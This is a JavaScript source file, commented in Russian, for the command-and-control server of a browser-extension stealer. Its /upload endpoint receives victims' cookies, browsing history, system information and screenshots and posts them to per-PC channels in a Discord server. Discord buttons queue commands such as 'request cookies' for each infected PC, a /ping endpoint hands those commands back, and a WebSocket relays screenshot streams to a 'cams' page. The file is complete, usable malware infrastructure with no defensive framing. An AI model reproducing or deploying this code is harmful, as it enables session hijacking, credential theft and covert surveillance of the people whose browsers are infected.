import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";

const app = express();
app.use(express.json({ limit: "50mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

const ONLINE_TIMEOUT = 3*60*1000;
const onlinePCs = {};
const pendingCommands = {};
const channelByPC = {};
const messagesWithButtons = {};

// Хранилище WS-подключений по pcId
const wsClients = {};

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", ()=>console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Кнопки управления ----------
function createControlButtons(pcId) {
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${pcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${pcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${pcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${pcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${pcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, ...pcIdParts] = interaction.customId.split("|");
    const pcId = pcIdParts.join("|");
    const lastPing = onlinePCs[pcId];
    const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);

    if(command === "check_online") {
        await interaction.reply({ content: isOnline?`✅ ПК ${pcId} онлайн`:`❌ ПК ${pcId} оффлайн`, ephemeral:true });
        return;
    }

    if(!isOnline){
        await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral:true });
        return;
    }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral:true });
});

// ---------- Категория и канал ----------
async function getOrCreateCategory(guild, name){
    const channels = await guild.channels.fetch();
    let category = channels.find(c=>c.type===ChannelType.GuildCategory && c.name===name);
    if(!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    return category;
}

async function getOrCreateTextChannel(guild, name, parentId){
    const channels = await guild.channels.fetch();
    let channel = channels.find(c=>c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
    return channel;
}

// ---------- Приём данных от расширения ----------
app.post("/upload", async (req,res)=>{
    try{
        const { pcId,cookies,history,systemInfo,tabs,extensions,screenshot,command } = req.body;
        if(!pcId) return res.status(400).json({ error:"pcId required" });

        onlinePCs[pcId] = Date.now();
        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild,CATEGORY_NAME);

        let channel;
        if(channelByPC[pcId]){
            try { channel = await guild.channels.fetch(channelByPC[pcId]); }
            catch { channel = await getOrCreateTextChannel(guild, pcId, category.id); }
        } else channel = await getOrCreateTextChannel(guild, pcId, category.id);

        channelByPC[pcId] = channel.id;

        const files = [];
        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies,null,2)), name: `${pcId}-cookies.json` });
        if(history) files.push({ attachment: Buffer.from(JSON.stringify(history,null,2)), name: `${pcId}-history.json` });
        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo,null,2)), name: `${pcId}-system.json` });
        if(screenshot) files.push({ attachment: Buffer.from(screenshot,"base64"), name: `${pcId}-screenshot.jpeg` });

        if(files.length) await channel.send({ files });

        if(messagesWithButtons[pcId]){
            try {
                const oldMsg = await channel.messages.fetch(messagesWithButtons[pcId]);
                if(oldMsg) await oldMsg.delete();
            } catch(err){ console.error('Failed to delete old buttons message', err); }
        }

        const newMsg = await channel.send({ content:`Управление ПК ${pcId}`, components:createControlButtons(pcId) });
        messagesWithButtons[pcId] = newMsg.id;

        // ---------- Отправка скриншота через WS ----------
        if(screenshot && wsClients[pcId]){
            wsClients[pcId].forEach(ws=>ws.send(screenshot));
        }

        res.json({ success:true });
    } catch(err){ console.error(err); res.status(500).json({ error:err.message }); }
});

// ---------- Пинг от расширения ----------
app.post("/ping",(req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({ error:"pcId required" });

    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId]||[];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- Статика и веб-интерфейс ----------
app.use(express.static("public")); // папка с HTML/JS клиентом

app.get("/cams", (req,res)=>{
    res.sendFile(new URL("./public/cams.html", import.meta.url));
});

// ---------- WebSocket для видеопотока ----------
const wss = new WebSocketServer({ noServer: true });

wss.on("connection", (ws, req) => {
    const pcId = new URL(req.url, `http://${req.headers.host}`).searchParams.get("pcId");
    if(!pcId) return ws.close();

    if(!wsClients[pcId]) wsClients[pcId] = [];
    wsClients[pcId].push(ws);

    ws.on("close", ()=>{
        wsClients[pcId] = wsClients[pcId].filter(c=>c!==ws);
    });
});

// Интеграция WS с HTTP сервером Express
import http from "http";
const server = http.createServer(app);
server.on("upgrade", (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

// ---------- Запуск ----------
const PORT = process.env.PORT || 3000;
server.listen(PORT, ()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
